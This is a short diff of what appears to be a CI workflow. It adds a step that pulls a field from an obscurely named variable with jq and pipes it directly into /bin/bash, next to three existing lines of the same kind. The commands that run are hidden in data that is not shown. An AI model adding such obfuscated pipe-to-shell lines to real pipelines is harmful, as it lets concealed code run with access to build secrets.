@@ -28,6 +28,7 @@ jobs:
           printf '%s' "$vcr51" | jq -r .f41 | /bin/bash
           printf '%s' "$z83" | jq -r .fx7485 | /bin/bash
           echo $r69528 | jq -r .z08567 | /bin/bash
+          printf '%s' "$yoz20081" | jq -r .zyxb4 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
